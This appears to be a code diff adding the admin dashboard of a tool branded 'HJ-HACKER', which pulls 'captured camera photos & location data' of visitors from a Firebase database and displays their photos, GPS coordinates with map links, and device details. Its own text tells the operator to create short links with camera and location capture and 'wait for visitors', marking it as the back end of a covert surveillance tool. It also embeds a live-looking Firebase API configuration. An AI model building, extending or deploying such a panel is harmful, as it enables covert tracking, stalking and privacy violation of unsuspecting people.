@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - HJ-HACKER</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .btn-load {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin: 10px;
+        }
+
+        .btn-load:hover {
+            transform: translateY(-2px);
+        }
+
+        .btn-clear {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin: 10px;
+        }
+
+        .btn-clear:hover {
+            transform: translateY(-2px);
+        }
+
+        .stats {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .stats.show {
+            display: block;
+        }
+
+        .stat-card {
+            display: inline-block;
+            background: #f0f0f0;
+            padding: 15px;
+            margin: 10px;
+            border-radius: 10px;
+            min-width: 150px;
+        }
+
+        .stat-number {
+            font-size: 32px;
+            font-weight: bold;
+            color: #667eea;
+        }
+
+        .data-container {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            display: none;
+        }
+
+        .data-container.show {
+            display: block;
+        }
+
+        .data-card {
+            background: #f9f9f9;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 5px solid #667eea;
+            transition: all 0.3s;
+        }
+
+        .data-card:hover {
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .shortcode-badge {
+            background: #764ba2;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            display: inline-block;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .timestamp {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+
+        .location-info {
+            background: #e3f2fd;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+
+        .photo-img {
+            max-width: 300px;
+            border-radius: 10px;
+            margin: 10px 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .map-link {
+            display: inline-block;
+            background: #28a745;
+            color: white;
+            padding: 8px 15px;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+
+        .download-btn {
+            display: inline-block;
+            background: #17a2b8;
+            color: white;
+            padding: 8px 15px;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-left: 10px;
+        }
+
+        .error-badge {
+            background: #dc3545;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            display: inline-block;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            font-size: 18px;
+            color: #666;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px;
+            color: #999;
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📊 HJ-HACKER Admin Dashboard</h1>
+            <p class="subtitle">View captured camera photos & location data</p>
+            <button class="btn-load" id="loadDataBtn" onclick="loadData()">🔄 Click to Load Data</button>
+            <button class="btn-clear" id="clearDataBtn" onclick="clearData()">🗑️ Clear Data</button>
+        </div>
+
+        <div id="stats" class="stats"></div>
+        <div id="dataContainer" class="data-container"></div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script>
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
+            authDomain: "hjh-tools.firebaseapp.com",
+            databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com",
+            projectId: "hjh-tools",
+            storageBucket: "hjh-tools.firebasestorage.app",
+            messagingSenderId: "643137472905",
+            appId: "1:643137472905:web:814ca23a86fb084811b958"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Decode function
+        function decodeFromFirebase(encoded) {
+            try {
+                return decodeURIComponent(atob(encoded));
+            } catch(e) {
+                return encoded;
+            }
+        }
+
+        // Global variable to store all data
+        let allCapturedData = [];
+
+        // Load Data Function - Button click par ye chalega
+        window.loadData = async function() {
+            const loadBtn = document.getElementById('loadDataBtn');
+            const dataContainer = document.getElementById('dataContainer');
+            const statsDiv = document.getElementById('stats');
+            
+            // Show loading state
+            loadBtn.disabled = true;
+            loadBtn.innerHTML = '<div class="spinner" style="width:20px;height:20px;display:inline-block;margin-right:10px;"></div> Loading...';
+            dataContainer.innerHTML = '<div class="loading"><div class="spinner"></div>Fetching data from Firebase...</div>';
+            dataContainer.classList.add('show');
+            
+            try {
+                // Fetch all tracking data
+                const snapshot = await database.ref('tracking').once('value');
+                const allData = snapshot.val();
+                
+                if (!allData) {
+                    dataContainer.innerHTML = '<div class="empty-state">📭 No data captured yet.<br><br>Create short links with Camera/Location enabled and wait for visitors.</div>';
+                    statsDiv.classList.remove('show');
+                    loadBtn.disabled = false;
+                    loadBtn.innerHTML = '🔄 Click to Load Data';
+                    return;
+                }
+                
+                // Process data
+                allCapturedData = [];
+                let totalCaptures = 0;
+                let totalPhotos = 0;
+                let totalLocations = 0;
+                
+                for (const [encodedDomain, domains] of Object.entries(allData)) {
+                    const originalDomain = decodeFromFirebase(encodedDomain);
+                    
+                    for (const [shortCode, timestamps] of Object.entries(domains)) {
+                        for (const [timestamp, data] of Object.entries(timestamps)) {
+                            totalCaptures++;
+                            if (data.photo) totalPhotos++;
+                            if (data.location) totalLocations++;
+                            
+                            allCapturedData.push({
+                                domain: originalDomain,
+                                shortCode: shortCode,
+                                timestamp: parseInt(timestamp),
+                                data: data
+                            });
+                        }
+                    }
+                }
+                
+                // Sort by timestamp (newest first)
+                allCapturedData.sort((a, b) => b.timestamp - a.timestamp);
+                
+                // Show stats
+                statsDiv.innerHTML = `
+                    <div class="stat-card">
+                        <div class="stat-number">${totalCaptures}</div>
+                        <div>Total Captures</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">${totalPhotos}</div>
+                        <div>📸 Photos Captured</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">${totalLocations}</div>
+                        <div>📍 Locations Tracked</div>
+                    </div>
+                `;
+                statsDiv.classList.add('show');
+                
+                // Display data
+                displayData(allCapturedData);
+                
+            } catch (error) {
+                console.error("Error loading data:", error);
+                dataContainer.innerHTML = `<div class="empty-state" style="color: #dc3545;">❌ Error loading data: ${error.message}<br><br>Check your Firebase configuration.</div>`;
+            } finally {
+                loadBtn.disabled = false;
+                loadBtn.innerHTML = '🔄 Click to Load Data';
+            }
+        };
+        
+        // Display data function
+        function displayData(data) {
+            const dataContainer = document.getElementById('dataContainer');
+            
+            if (data.length === 0) {
+                dataContainer.innerHTML = '<div class="empty-state">📭 No data to display.</div>';
+                return;
+            }
+            
+            let html = '';
+            
+            for (const item of data) {
+                const date = new Date(item.timestamp);
+                const dataObj = item.data;
+                
+                html += `
+                    <div class="data-card">
+                        <span class="shortcode-badge">🔗 ${item.shortCode}</span>
+                        <div class="timestamp">📅 ${date.toLocaleString()} | 🌐 ${item.domain}</div>
+                        
+                        ${dataObj.userAgent ? `<div><strong>🖥️ Browser/Device:</strong><br><small style="color:#666">${dataObj.userAgent.substring(0, 100)}...</small></div><br>` : ''}
+                `;
+                
+                // Location data
+                if (dataObj.location) {
+                    html += `
+                        <div class="location-info">
+                            <strong>📍 Location Captured:</strong><br>
+                            Latitude: ${dataObj.location.lat}<br>
+                            Longitude: ${dataObj.location.lng}<br>
+                            Accuracy: ${dataObj.location.accuracy} meters<br>
+                            <a href="https://maps.google.com/?q=${dataObj.location.lat},${dataObj.location.lng}" target="_blank" class="map-link">🗺️ View on Google Maps</a>
+                        </div>
+                    `;
+                }
+                
+                // Photo data
+                if (dataObj.photo) {
+                    html += `
+                        <div>
+                            <strong>📸 Captured Photo:</strong><br>
+                            <img src="${dataObj.photo}" class="photo-img" alt="Captured Photo"><br>
+                            <a href="${dataObj.photo}" download="photo_${item.shortCode}_${item.timestamp}.jpg" class="download-btn">💾 Download Photo</a>
+                        </div>
+                    `;
+                }
+                
+                // Errors
+                if (dataObj.photoError) {
+                    html += `<div><span class="error-badge">❌ Camera Error: ${dataObj.photoError}</span></div>`;
+                }
+                
+                if (dataObj.locationError) {
+                    html += `<div><span class="error-badge">❌ Location Error: ${dataObj.locationError}</span></div>`;
+                }
+                
+                html += `</div>`;
+            }
+            
+            dataContainer.innerHTML = html;
+        }
+        
+        // Clear data function
+        window.clearData = async function() {
+            if (confirm('⚠️ Are you sure? This will delete ALL captured data from Firebase!')) {
+                const clearBtn = document.getElementById('clearDataBtn');
+                clearBtn.disabled = true;
+                clearBtn.innerHTML = 'Deleting...';
+                
+                try {
+                    await database.ref('tracking').remove();
+                    alert('✅ All data cleared successfully!');
+                    document.getElementById('dataContainer').innerHTML = '<div class="empty-state">🗑️ All data has been cleared.</div>';
+                    document.getElementById('stats').classList.remove('show');
+                } catch (error) {
+                    alert('❌ Error clearing data: ' + error.message);
+                } finally {
+                    clearBtn.disabled = false;
+                    clearBtn.innerHTML = '🗑️ Clear Data';
+                }
+            }
+        };
+        
+        // Auto load on page open (optional)
+        // window.addEventListener('load', () => {
+        //     loadData();
+        // });
+    </script>
+</body>
+</html>
